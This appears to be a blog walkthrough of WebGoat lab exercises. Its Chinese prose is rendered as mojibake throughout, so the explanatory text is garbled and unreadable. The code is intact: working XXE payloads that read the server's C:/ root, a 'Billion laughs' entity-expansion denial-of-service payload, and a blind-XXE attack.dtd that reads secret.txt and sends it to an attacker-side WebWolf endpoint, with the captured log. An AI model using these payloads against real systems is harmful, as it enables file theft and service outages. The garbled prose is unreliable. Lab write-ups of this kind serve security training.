<p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/109560492">https://blog.csdn.net/zy15667076526/article/details/109560492</a></p>
</blockquote>
<h3 id="4-7">4.</h3>
<p>åœ¨æ­¤ä½œä¸šä¸­ï¼Œæ‚¨å°†ä¸ºç…§ç‰‡æ·»åŠ æ³¨é‡Šï¼Œåœ¨æäº¤è¡¨å•æ—¶å°è¯•æ‰§è¡Œ XXE ä½¿ç”¨æ³¨é‡Šå­—æ®µè¿›è¡Œæ³¨å…¥ã€‚å°è¯•åˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚</p>
<p>å…ˆæŠ“åŒ…çœ‹çœ‹</p>
<p>ä½ å¯ä»¥çœ‹å‘é€çš„æ•°æ®åŒ…æºå¸¦çš„æ•°æ®æ˜¯xml,è¯´æ˜ç”¨æˆ·å¯æ§</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;comment&gt;&lt;text&gt;666&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">&lt;!ENTITY flag SYSTEM &#x27;file:///C:/&#x27;&gt; </span><br><span class="line">&lt;!-- file:// è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åè®®çš„URLï¼Œ/C:/ è¡¨ç¤ºCç›˜çš„æ ¹ç›®å½•ã€‚--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;</span><br><span class="line">&amp;flag;</span><br><span class="line">&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥çœ‹åˆ°flagäº†ï¼Œå¹¶ä¸”è¯„è®ºåŒºä¹Ÿæœ‰è¿”å›çš„æ•°æ®</p>
<h3 id="5-6">5-6</h3>
<p>5æ˜¯æŒ‡å¯¼ä½ æ”»å‡»çš„ï¼Œ6æ˜¯ä»£ç å®¡è®¡è§’åº¦å‘ç°XXE</p>
<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"> XXE prevention sheet</a></p>
<h3 id="7-4">7</h3>
<p>åœ¨ç°ä»£RESTæ¡†æ¶ä¸­ï¼ŒæœåŠ¡å™¨å¯èƒ½èƒ½å¤Ÿæ¥å—æ‚¨ä½œä¸ºå¼€å‘äººå‘˜æ²¡æœ‰æƒ³åˆ°çš„æ•°æ®æ ¼å¼ã€‚å› æ­¤ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ JSON ç«¯ç‚¹å®¹æ˜“å—åˆ° XXE æ”»å‡»ã€‚</p>
<p>åŒæ ·æ˜¯ç›¸åŒçš„ç»ƒä¹ ï¼Œä½†å°è¯•æ‰§è¡Œä¸ç¬¬ä¸€æ¬¡èµ‹å€¼ç›¸åŒçš„ XML æ³¨å…¥ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬åŒæ ·æ˜¯å‘é€è¯„è®ºæŠ“åŒ…</p>
<p>å‘ç°<code>Content-Type:application/json</code>ï¼Œå³jsonæ¨¡å¼çš„</p>
<p>ä½†æ˜¯æ ¹æ®æç¤ºæ²¡æœ‰åªæ¥æ”¶jsonæ–‡ä»¶ï¼Œè¿™é‡Œç›´æ¥æ¢æˆ<code>application/xml</code>å°±è¡Œäº†</p>
<p>æŠŠä¸‹é¢çš„æ•°æ®éƒ¨åˆ†æ¢æˆ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///C:/&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="8-3">8.</h3>
<p>å¯¹ç¬¬7é¢˜çš„è§£é‡Š</p>
<h3 id="9-3">9.</h3>
<p>è¿™ä¸ªæŒºæœ‰æ„æ€çš„ï¼Œåˆ©ç”¨XXEè¿›è¡ŒDOSæ”»å‡»</p>
<p>æ¡ˆä¾‹</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">lolz</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“ XML è§£æå™¨åŠ è½½æ­¤æ–‡æ¡£æ—¶ï¼Œå®ƒä¼šçœ‹åˆ°å®ƒåŒ…å«ä¸€ä¸ªæ ¹å…ƒç´ â€œlolzâ€ï¼Œå…¶ä¸­åŒ…å«æ–‡æœ¬â€œ&amp;lol9;â€ã€‚ä½†æ˜¯ï¼Œâ€œ&amp;lol9;â€æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œå®ƒæ‰©å±•ä¸ºåŒ…å«åä¸ªâ€œ&amp;lol8;â€å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²ã€‚æ¯ä¸ªâ€œ&amp;lol8;â€å­—ç¬¦ä¸²éƒ½æ˜¯ä¸€ä¸ªå®šä¹‰çš„å®ä½“ï¼Œå¯æ‰©å±•ä¸ºåä¸ªâ€œ&amp;lol7;â€å­—ç¬¦ä¸²ï¼Œä¾æ­¤ç±»æ¨ã€‚åœ¨å¤„ç†å®Œæ‰€æœ‰å®ä½“æ‰©å±•åï¼Œè¿™ä¸ªå°çš„ ï¼ˆ&lt; 1 KBï¼‰ XML å—å®é™…ä¸Šå°†å ç”¨è¿‘ 3 GB çš„å†…å­˜ã€‚</p>
<p>è¿™è¢«ç§°ä¸º&quot;Billion laughs&quot;</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Billion_laughs">ç»´åŸºç™¾ç§‘ï¼ˆéœ€è¦æ¢¯å­ï¼‰</a></p>
<h3 id="10-4">10.</h3>
<p>å±•ç¤ºäº†å¦‚ä½•é€šè¿‡ Blind XXE æ”»å‡» ping æœåŠ¡å™¨</p>
<p>11å°±æ˜¯å®æ“</p>
<h3 id="11-3">11.</h3>
<p>æ ¹æ®é¢˜æ„ï¼Œç›—å– ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„</p>
<p><code>C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt</code></p>
<p>æç¤ºæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ WebWolf çš„landingé¡µé¢ä¸Šä¼ æ­¤æ–‡ä»¶ï¼š<a target="_blank" rel="noopener" href="http://localhost:9090/landing">http://localhost:9090/landing</a></p>
<p>WebGoatæ˜¯å½“å‰è®ºå›æœåŠ¡å™¨ï¼Œé‡Œé¢æœ‰æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶secret.txt<br>
WebWolfæ˜¯å…¥ä¾µè€…çš„æœåŠ¡å™¨ï¼Œæ‰˜ç®¡äº†ä¸€ä¸ªattack.dtdæ”»å‡»æ–‡ä»¶</p>
<p>æµç¨‹ï¼š<br>
å…¥ä¾µè€…è¿›å…¥è¢«å®³è€…çš„è®ºå›ï¼Œå‘é€ä¿¡æ¯åŒæ—¶ç”¨Burpæ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹è‡ªå·±çš„è¯„è®ºå†…å®¹ä½¿å…¶è¿œç¨‹é“¾æ¥åˆ°å…¥ä¾µè€…çš„WebWolfç½‘ç«™çš„attack.dtdæ–‡ä»¶ï¼Œattack.dtdæ–‡ä»¶è¯»å–äº†è¢«å®³è€…æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ä¿¡æ¯ï¼Œè¢«å®³è€…æœåŠ¡å™¨å°†è¯¥ç§å¯†ä¿¡æ¯è¿”å›åˆ°è®ºå›ä¸­å¹¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚</p>
<p>åˆ›å»ºattack.dtdæ–‡ä»¶</p>
<blockquote>
<p>æ³¨æ„éœ€è¦è·å–çš„æ–‡ä»¶æ¢æˆä½ çš„</p>
</blockquote>
<p>fileç”¨äºè·å–ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶</p>
<p>printç”¨äºå‘é€åˆ°webwolfï¼Œè¿™ä¸ªè¯·æ±‚ä¼šè¢«æ‹¦æˆª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">&lt;!-- &amp;#37; æ˜¯ä¸€ä¸ªå­—ç¬¦å®ä½“å¼•ç”¨ï¼Œä»£è¡¨ç™¾åˆ†å·ï¼ˆ%ï¼‰ã€‚ç¡®ä¿äº†ç™¾åˆ†å·ä¸ä¼šè¢«è¯¯è§£ä¸ºXMLæ ‡è®°çš„ä¸€éƒ¨åˆ†ã€‚ --&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶åéšä¾¿å‘é€è¯„è®ºburpæŠ“åŒ…,åœ¨ç»“å°¾åŠ ä¸Špayload ï¼Œæ³¨æ„ä¸‹é¢çš„urlä¸­çš„usernameæ¢æˆä½ çš„ï¼Œattack.dtdæ–‡ä»¶åä¹Ÿä¸èƒ½å‡ºé”™</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/username/attack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%print;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>cute<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å»webwolfçœ‹æ”¶åˆ°çš„æ•°æ®(urlåé¢çš„text)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;timestamp&quot; : &quot;2024-01-05T09:03:11.930091100Z&quot;,</span><br><span class="line">  &quot;principal&quot; : null,</span><br><span class="line">  &quot;session&quot; : null,</span><br><span class="line">  &quot;request&quot; : &#123;</span><br><span class="line">    &quot;method&quot; : &quot;GET&quot;,</span><br><span class="line">    &quot;uri&quot; : &quot;http://localhost:9090/landing?text=WebGoat%208.0%20rocks...%20(AgzOeuyeHm)&quot;,</span><br><span class="line">    &quot;headers&quot; : &#123;</span><br><span class="line">      &quot;Accept&quot; : [ &quot;text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2&quot; ],</span><br><span class="line">      &quot;Connection&quot; : [ &quot;keep-alive&quot; ],</span><br><span class="line">      &quot;User-Agent&quot; : [ &quot;Java/17.0.9&quot; ],</span><br><span class="line">      &quot;Host&quot; : [ &quot;localhost:9090&quot; ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;remoteAddress&quot; : null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;response&quot; : &#123;</span><br><span class="line">    &quot;status&quot; : 200,</span><br><span class="line">    &quot;headers&quot; : &#123; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;timeTaken&quot; : 11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åè§£å¯†å‡ºæ¥æ—¶</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebGoat 8.0 rocks... (AgzOeuyeHm)</span><br></pre></td></tr></table></figure>
<p>æŠŠè¿™ä¸ªå‘é€åˆ°è¯„è®ºå°±è¡Œäº†</p>
<blockquote>
<p>ç®€è¿°ä¸€ä¸‹è¿‡ç¨‹ï¼šå‘é€ä¿®æ”¹çš„æ•°æ®â€”&gt;%dtd;è®¿é—®æ”»å‡»è€…æœåŠ¡å™¨ä¸Šçš„dtdæ–‡ä»¶â€”&gt;è°ƒç”¨printå£°æ˜sendï¼Œè°ƒç”¨sendï¼Œsendä¼šå†è°ƒç”¨fileï¼Œfileç”¨äºè·å–ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œsendå‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨ï¼Œæ”»å‡»è€…æœåŠ¡å™¨è·å–æ•°æ®åè§£æ</p>
</blockquote>
<h4 id="ç–‘é—®ï¼š">ç–‘é—®ï¼š</h4>
<p>1.è¿™é‡Œä¸ºä»€ä¹ˆéœ€è¦åµŒå¥—</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ç­”ï¼šæˆ‘è¯•è¿‡åçœ‹äº†è¿”å›çš„æ•°æ®</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[5,7]\\nMessage: Server returned HTTP response code: 400 for URL: http:\\/\\/localhost:9090\\/landing?text=%file;]&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">400 Bad Request æ˜¯ç”±äºæ˜æ˜¾çš„å®¢æˆ·ç«¯é”™è¯¯ï¼ˆä¾‹å¦‚ï¼Œæ ¼å¼é”™è¯¯çš„è¯·æ±‚è¯­æ³•ï¼Œå¤ªå¤§çš„å¤§å°ï¼Œæ— æ•ˆçš„è¯·æ±‚æ¶ˆæ¯æˆ–æ¬ºéª—æ€§è·¯ç”±è¯·æ±‚ï¼‰ï¼ŒæœåŠ¡å™¨ä¸èƒ½æˆ–ä¸ä¼šå¤„ç†è¯¥è¯·æ±‚ã€‚</span></span><br></pre></td></tr></table></figure>
<p>åµŒå¥—åº”è¯¥æ˜¯ä¸ºäº†é˜²æ­¢å®ä½“ç”¨äºè¡¨ç¤ºä¸€äº›æ— æ³•ç›´æ¥è¡¨ç¤ºçš„å­—ç¬¦æˆ–ç»“æ„ï¼ˆä¸ªäººçŒœæµ‹ï¼‰</p>
<p>2.ä¸ºä»€ä¹ˆprintåè¿˜éœ€è¦sendï¼Œprintä¸æ˜¯ä¼šè°ƒç”¨sendå—</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">dtd;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="built_in">print</span>;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">send;</span></span><br></pre></td></tr></table></figure>
<p>ç­”ï¼šæ²¡æœ‰è°ƒç”¨ï¼Œä»…ä»…æ—¶å£°æ˜äº†å®ä½“ï¼Œè€Œsendä¼šç›´æ¥è°ƒç”¨file</p>
<h3 id="12-13">12-13</h3>
<p>è®²äº†xxeå’Œç¼“è§£æªæ–½å’Œç”¨è¿‡é™æ€ä»£ç åˆ†ææŸ¥æ‰¾xxeé—®é¢˜</p>
<h2 id="7-Broken-Access-Controlï¼ˆè®¿é—®æ§åˆ¶ä¸­æ–­ï¼‰">7.Broken Access Controlï¼ˆè®¿é—®æ§åˆ¶ä¸­æ–­ï¼‰</h2>
<h3 id="1-Insecure-Direct-Object-Referencesï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¼•ç”¨å¯¹è±¡ï¼‰">1.Insecure Direct Object Referencesï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¼•ç”¨å¯¹è±¡ï¼‰</h3>
<h4 id="1-4">1.</h4>
<p>ç›´æ¥å¯¹è±¡å¼•ç”¨<br>
ç›´æ¥å¯¹è±¡å¼•ç”¨æ˜¯æŒ‡åº”ç”¨ç¨‹åºä½¿ç”¨å®¢æˆ·ç«¯æä¾›çš„è¾“å…¥æ¥è®¿é—®æ•°æ®å’Œå¯¹è±¡ã€‚</p>
<p>ä¾‹å­<br>
ä½¿ç”¨ GET æ–¹æ³•çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ç¤ºä¾‹å¯èƒ½å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://some.company.tld/dor?id=12345</span><br><span class="line"></span><br><span class="line">https://some.company.tld/images?img=12345</span><br><span class="line"></span><br><span class="line">https://some.company.tld/dor/12345</span><br></pre></td></tr></table></figure>
<p>å…¶ä»–æ–¹æ³•<br>
POSTã€PUTã€DELETE æˆ–å…¶ä»–æ–¹æ³•ä¹Ÿå¯èƒ½å®¹æ˜“å—åˆ°å½±å“ï¼Œä¸»è¦ä»…åœ¨æ–¹æ³•å’Œæ½œåœ¨æœ‰æ•ˆè½½è·ä¸Šæœ‰æ‰€ä¸åŒã€‚</p>
<p>ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨<br>
å½“å¼•ç”¨æœªå¾—åˆ°æ­£ç¡®å¤„ç†æ—¶ï¼Œè¿™äº›è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œå¹¶å…è®¸æˆæƒç»•è¿‡æˆ–æŠ«éœ²å¯ç”¨äº æ‰§è¡Œç”¨æˆ·ä¸åº”èƒ½å¤Ÿæ‰§è¡Œæˆ–è®¿é—®çš„æ“ä½œæˆ–è®¿é—®æ•°æ®ã€‚ å‡è®¾ä½œä¸ºç”¨æˆ·ï¼Œæ‚¨å»æŸ¥çœ‹æ‚¨çš„ä¸ªäººèµ„æ–™ï¼ŒURL å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><code>https://some.company.tld/app/user/23398</code></p>
<p>â€¦æ‚¨å¯ä»¥åœ¨é‚£é‡ŒæŸ¥çœ‹æ‚¨çš„ä¸ªäººèµ„æ–™ã€‚å¦‚æœå¯¼èˆªåˆ°ä»¥ä¸‹ä½ç½®ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼š</p>
<p><code>https://some.company.tld/app/user/23399</code>â€¦æˆ–åœ¨æœ«å°¾ä½¿ç”¨å¦ä¸€ä¸ªæ•°å­—ã€‚å¦‚æœæ‚¨å¯ä»¥æ“ä½œæ•°å­—ï¼ˆç”¨æˆ· IDï¼‰å¹¶æŸ¥çœ‹ä»–äººçš„é…ç½®æ–‡ä»¶ï¼Œåˆ™å¯¹è±¡å¼•ç”¨æ˜¯ä¸å®‰å…¨çš„ã€‚ å½“ç„¶ï¼Œè¿™å¯ä»¥æ£€æŸ¥æˆ–æ‰©å±•åˆ° GET æ–¹æ³•ä¹‹å¤–ï¼Œä»¥æŸ¥çœ‹æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ“ä½œæ•°æ®ã€‚</p>
<p>æ›´å¤šå¥½è¯»ç‰©<br>
åœ¨æˆ‘ä»¬ç»§ç»­ç»ƒä¹ ä¹‹å‰ï¼Œè¿™é‡Œæœ‰ä¸€äº›å…³äºä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨çš„å¥½è¯»ç‰©ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_%EF%BC%88OTG-AUTHZ-004%EF%BC%89">https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_ï¼ˆOTG-AUTHZ-004ï¼‰</a></p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control</a></p>
<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References">https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References</a></p>
<p><a target="_blank" rel="noopener" href="http://cwe.mitre.org/data/definitions/639.html">http://cwe.mitre.org/data/definitions/639.html</a></p>
<h4 id="2-8">2.</h4>
<p>å…ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Œåæ»¥ç”¨æˆæƒ<br>
è®¸å¤šè®¿é—®æ§åˆ¶é—®é¢˜å®¹æ˜“å—åˆ°ç»è¿‡èº«ä»½éªŒè¯ä½†æœªç»æˆæƒçš„ç”¨æˆ·çš„æ”»å‡»ã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ä»åˆæ³•èº«ä»½éªŒè¯å¼€å§‹ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†å¯»æ‰¾ç»•è¿‡æˆ–æ»¥ç”¨æˆæƒçš„æ–¹æ³•ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¸æˆ·çš„ ID å’Œå¯†ç æ˜¯â€œtomâ€å’Œâ€œcatâ€ï¼ˆè¿™æ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„åº”ç”¨ç¨‹åºï¼Œå¯¹å§ï¼Ÿ</p>
<p>èº«ä»½éªŒè¯åï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªå±å¹•ã€‚</p>
<p>è¿™é¢˜å°±æ˜¯åˆæ³•çš„èº«ä»½éªŒè¯ï¼Œç”¨tomå’Œcatç™»å½•å°±è¡Œ</p>
<h4 id="3-6">3.</h4>
<p>æ ¹æ®é¢˜æ„ï¼ŒæŸ¥çœ‹è¯·æ±‚ä¸­çš„éæ˜¾ç¤ºå†…å®¹çš„å±æ€§</p>
<blockquote>
<p>A consistent principle from the offensive side of AppSec is to view differences from the raw response to what is visible</p>
<p>â€œAppSecâ€ æ˜¯ â€œApplication Securityâ€ çš„ç¼©å†™ï¼ŒæŒ‡çš„æ˜¯åº”ç”¨ç¨‹åºå®‰å…¨ã€‚</p>
<p>åœ¨åº”ç”¨ç¨‹åºå®‰å…¨ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨åº”ç”¨ç¨‹åºçš„æ¼æ´æ¥è·å–æœªæˆæƒçš„è®¿é—®æˆ–æ‰§è¡Œæ¶æ„æ“ä½œã€‚ä¸ºäº†å®ç°è¿™ä¸€ç›®æ ‡ï¼Œæ”»å‡»è€…éœ€è¦äº†è§£åº”ç”¨ç¨‹åºçš„å†…éƒ¨å·¥ä½œåŸç†å’Œæ½œåœ¨çš„å¼±ç‚¹ã€‚</p>
